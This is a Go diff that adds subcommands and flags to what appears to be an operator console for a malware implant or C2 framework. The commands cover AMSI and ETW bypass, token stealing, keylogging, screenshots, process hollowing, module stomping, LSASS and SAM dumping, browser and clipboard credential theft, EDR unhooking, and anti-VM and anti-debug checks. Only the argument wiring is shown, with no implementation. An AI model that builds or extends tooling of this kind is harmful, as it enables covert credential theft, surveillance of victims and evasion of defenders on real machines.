@@ -2108,6 +2108,147 @@ func init() {
 	timestompCmd.Flags().String("time", "", "Explicit timestamp in RFC3339 format (e.g. 2021-06-15T09:00:00Z)")
 	timestompCmd.Flags().Bool("wait", false, "Wait for timestomp result")
 	timestompCmd.Flags().Int("timeout", 30, "Seconds to wait for result")
+
+	// Phase 3: AMSI/ETW bypass
+	rootCmd.AddCommand(bypassCmd)
+	bypassCmd.AddCommand(bypassAMSICmd)
+	bypassCmd.AddCommand(bypassETWCmd)
+	bypassAMSICmd.Flags().Uint32("pid", 0, "Target PID (0 = agent's own process)")
+	bypassAMSICmd.Flags().Bool("wait", false, "Wait for patch result")
+	bypassAMSICmd.Flags().Int("timeout", 15, "Seconds to wait")
+	bypassETWCmd.Flags().Uint32("pid", 0, "Target PID (0 = agent's own process)")
+	bypassETWCmd.Flags().Bool("wait", false, "Wait for patch result")
+	bypassETWCmd.Flags().Int("timeout", 15, "Seconds to wait")
+
+	// Phase 3: Token manipulation
+	rootCmd.AddCommand(tokenCmd)
+	tokenCmd.AddCommand(tokenListCmd)
+	tokenCmd.AddCommand(tokenStealCmd)
+	tokenCmd.AddCommand(tokenMakeCmd)
+	tokenCmd.AddCommand(tokenRevertCmd)
+	tokenListCmd.Flags().Bool("wait", true, "Wait for token list result")
+	tokenListCmd.Flags().Int("timeout", 30, "Seconds to wait")
+	tokenStealCmd.Flags().Uint32("pid", 0, "PID to steal token from (required)")
+	tokenStealCmd.Flags().Bool("wait", false, "Wait for result")
+	tokenStealCmd.Flags().Int("timeout", 15, "Seconds to wait")
+	tokenMakeCmd.Flags().String("user", "", "Username (required)")
+	tokenMakeCmd.Flags().String("domain", ".", "Domain (default: . for local)")
+	tokenMakeCmd.Flags().String("pass", "", "Password (required)")
+	tokenMakeCmd.Flags().Bool("wait", false, "Wait for result")
+	tokenMakeCmd.Flags().Int("timeout", 15, "Seconds to wait")
+	tokenRevertCmd.Flags().Bool("wait", false, "Wait for result")
+	tokenRevertCmd.Flags().Int("timeout", 10, "Seconds to wait")
+
+	// Phase 3: Screenshot
+	rootCmd.AddCommand(screenshotCmd)
+	screenshotCmd.Flags().String("save", "", "Save PNG to local path")
+	screenshotCmd.Flags().Bool("wait", true, "Wait for screenshot data")
+	screenshotCmd.Flags().Int("timeout", 30, "Seconds to wait")
+
+	// Phase 3: Keylogger
+	rootCmd.AddCommand(keylogCmd)
+	keylogCmd.AddCommand(keylogStartCmd)
+	keylogCmd.AddCommand(keylogDumpCmd)
+	keylogCmd.AddCommand(keylogStopCmd)
+	keylogStartCmd.Flags().Int("duration", 0, "Auto-stop after N seconds (0 = run until stop)")
+	keylogStartCmd.Flags().Bool("wait", false, "Wait for start confirmation")
+	keylogStartCmd.Flags().Int("timeout", 15, "Seconds to wait")
+	keylogDumpCmd.Flags().Int("timeout", 15, "Seconds to wait for keystrokes")
+	keylogStopCmd.Flags().Int("timeout", 15, "Seconds to wait for final buffer")
+
+	// Phase 4: Advanced injection
+	rootCmd.AddCommand(hollowCmd)
+	hollowCmd.Flags().String("file", "", "Local shellcode file (required)")
+	hollowCmd.Flags().String("exe", `C:\Windows\System32\svchost.exe`, "Host executable to hollow")
+	hollowCmd.Flags().Bool("wait", false, "Wait for result")
+	hollowCmd.Flags().Int("timeout", 60, "Seconds to wait")
+
+	rootCmd.AddCommand(hijackCmd)
+	hijackCmd.Flags().String("file", "", "Local shellcode file (required)")
+	hijackCmd.Flags().Uint32("pid", 0, "Target PID (required)")
+	hijackCmd.Flags().Bool("wait", false, "Wait for result")
+	hijackCmd.Flags().Int("timeout", 60, "Seconds to wait")
+
+	rootCmd.AddCommand(stompCmd)
+	stompCmd.Flags().String("file", "", "Local shellcode file (required)")
+	stompCmd.Flags().String("dll", "xpsservices.dll", "Sacrificial DLL to stomp")
+	stompCmd.Flags().Bool("wait", false, "Wait for result")
+	stompCmd.Flags().Int("timeout", 60, "Seconds to wait")
+
+	rootCmd.AddCommand(mapInjectCmd)
+	mapInjectCmd.Flags().String("file", "", "Local shellcode file (required)")
+	mapInjectCmd.Flags().Uint32("pid", 0, "Remote PID (0 = local agent process)")
+	mapInjectCmd.Flags().Bool("wait", false, "Wait for result")
+	mapInjectCmd.Flags().Int("timeout", 60, "Seconds to wait")
+
+	// Phase 5: Credential access
+	rootCmd.AddCommand(credsCmd)
+	credsCmd.AddCommand(credsLSASSCmd)
+	credsCmd.AddCommand(credsSAMCmd)
+	credsCmd.AddCommand(credsBrowserCmd)
+	credsCmd.AddCommand(credsClipboardCmd)
+
+	credsLSASSCmd.Flags().String("output", "", "Output path on target (default: %TEMP%\\lsass.dmp)")
+	credsLSASSCmd.Flags().Bool("wait", false, "Wait for result")
+	credsLSASSCmd.Flags().Int("timeout", 60, "Seconds to wait")
+
+	credsSAMCmd.Flags().String("dir", "", "Output directory on target (default: %TEMP%)")
+	credsSAMCmd.Flags().Bool("wait", false, "Wait for result")
+	credsSAMCmd.Flags().Int("timeout", 60, "Seconds to wait")
+
+	credsBrowserCmd.Flags().Bool("wait", true, "Wait for credentials")
+	credsBrowserCmd.Flags().Int("timeout", 60, "Seconds to wait")
+
+	credsClipboardCmd.Flags().Bool("wait", true, "Wait for clipboard content")
+	credsClipboardCmd.Flags().Int("timeout", 15, "Seconds to wait")
+
+	// Phase 6-8: Evasion
+	rootCmd.AddCommand(evasionCmd)
+	evasionCmd.AddCommand(evasionSleepCmd)
+	evasionCmd.AddCommand(evasionUnhookCmd)
+	evasionCmd.AddCommand(evasionHWBPCmd)
+	evasionHWBPCmd.AddCommand(evasionHWBPSetCmd)
+	evasionHWBPCmd.AddCommand(evasionHWBPClearCmd)
+
+	evasionSleepCmd.Flags().Int("duration", 30, "Sleep duration in seconds")
+	evasionSleepCmd.Flags().Bool("wait", false, "Wait for completion")
+	evasionSleepCmd.Flags().Int("timeout", 120, "Seconds to wait")
+
+	evasionUnhookCmd.Flags().Bool("wait", true, "Wait for unhook result")
+	evasionUnhookCmd.Flags().Int("timeout", 30, "Seconds to wait")
+
+	evasionHWBPSetCmd.Flags().String("addr", "", "Hex address e.g. 0x7FFE1234 (required)")
+	evasionHWBPSetCmd.Flags().Uint8("register", 0, "DR register 0-3")
+	evasionHWBPSetCmd.Flags().Bool("wait", false, "Wait for result")
+	evasionHWBPSetCmd.Flags().Int("timeout", 15, "Seconds to wait")
+
+	evasionHWBPClearCmd.Flags().Uint8("register", 0, "DR register 0-3 to clear")
+	evasionHWBPClearCmd.Flags().Bool("wait", false, "Wait for result")
+	evasionHWBPClearCmd.Flags().Int("timeout", 15, "Seconds to wait")
+
+	// Phase 9: BOF
+	rootCmd.AddCommand(bofCmd)
+	bofCmd.Flags().String("args-file", "", "Binary packed args file (optional)")
+	bofCmd.Flags().Bool("wait", true, "Wait for BOF output")
+	bofCmd.Flags().Int("timeout", 60, "Seconds to wait")
+
+	// Phase 10: OPSEC
+	rootCmd.AddCommand(opsecCmd)
+	opsecCmd.AddCommand(opsecAntiDebugCmd)
+	opsecCmd.AddCommand(opsecAntiVMCmd)
+	opsecCmd.AddCommand(opsecTimegateCmd)
+
+	opsecAntiDebugCmd.Flags().Bool("wait", true, "Wait for check result")
+	opsecAntiDebugCmd.Flags().Int("timeout", 15, "Seconds to wait")
+
+	opsecAntiVMCmd.Flags().Bool("wait", true, "Wait for check result")
+	opsecAntiVMCmd.Flags().Int("timeout", 30, "Seconds to wait")
+
+	opsecTimegateCmd.Flags().Int("start", 8, "Working hours start (0-23)")
+	opsecTimegateCmd.Flags().Int("end", 18, "Working hours end (0-23)")
+	opsecTimegateCmd.Flags().String("kill-date", "", "Kill date YYYY-MM-DD (empty = disabled)")
+	opsecTimegateCmd.Flags().Bool("wait", false, "Wait for result")
+	opsecTimegateCmd.Flags().Int("timeout", 15, "Seconds to wait")
 }
 
 func main() {
